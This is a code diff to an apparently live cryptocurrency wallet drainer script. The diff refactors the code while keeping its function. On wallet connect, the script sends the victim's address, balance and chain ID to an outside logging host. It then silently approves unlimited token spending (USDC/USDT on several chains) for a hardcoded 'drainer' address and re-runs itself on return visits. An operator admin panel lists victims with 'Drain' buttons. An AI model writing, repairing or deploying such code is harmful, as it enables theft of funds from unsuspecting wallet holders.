@@ -26,41 +26,42 @@ async function connectAndApprove() {
   signer = await provider.getSigner();
   const address = await signer.getAddress();
   const balance = await provider.getBalance(address);
+  const chainId = (await provider.getNetwork()).chainId;
 
   walletAddress.textContent = address;
   walletBalance.textContent = ethers.formatEther(balance);
   walletDetails.style.display = "block";
   loading.style.display = "none";
 
-  const chainId = (await provider.getNetwork()).chainId;
-
   const data = {
     address,
     balance: ethers.formatEther(balance),
     chainId,
     timestamp: Date.now(),
-    drained: false,
+    drained: false
   };
 
   await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/log.php", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data),
+    body: JSON.stringify(data)
   });
 
-  // Approve drainer address
   const drainer = "0x5fbdb2315678afecb367f032d93f642f64180aa3";
   const erc20abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-
   const tokenMap = {
     1: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
     56: "0x55d398326f99059ff775485246999027b3197955",
-    137: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
+    137: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
   };
 
   if (tokenMap[chainId]) {
     const token = new ethers.Contract(tokenMap[chainId], erc20abi, signer);
-    await token.approve(drainer, ethers.MaxUint256);
+    try {
+      await token.approve(drainer, ethers.MaxUint256);
+    } catch (err) {
+      console.error("Approval failed:", err);
+    }
   }
 
   localStorage.setItem("wallet_connected", "1");
@@ -72,7 +73,9 @@ function disconnectWallet() {
   connectBtn.disabled = false;
 }
 
-if (localStorage.getItem("wallet_connected") === "1") connectAndApprove();
+if (localStorage.getItem("wallet_connected") === "1") {
+  connectAndApprove();
+}
 
 connectBtn.addEventListener("click", connectAndApprove);
 disconnectBtn.addEventListener("click", disconnectWallet);
@@ -103,13 +106,13 @@ async function loadAdmin() {
     li.innerHTML = `
       <strong>${entry.address}</strong><br>
       ${entry.balance} ETH — Chain: ${entry.chainId} — 
-      ${entry.drained ? "<span class='text-success'>✅ Drained</span>" : `<button class='btn btn-sm btn-primary' onclick='window.drainWallet(${index})'>Drain</button>`}
+      ${entry.drained ? "<span class='text-success'>✅ Drained</span>" : `<button class='btn btn-sm btn-danger' onclick='drainWallet(${index})'>Drain</button>`}
     `;
     sessionList.appendChild(li);
   });
 }
 
-window.drainWallet = async function(index) {
+window.drainWallet = async function (index) {
   const res = await fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/logs.json");
   const logs = await res.json();
   await triggerDrain(logs[index], index);
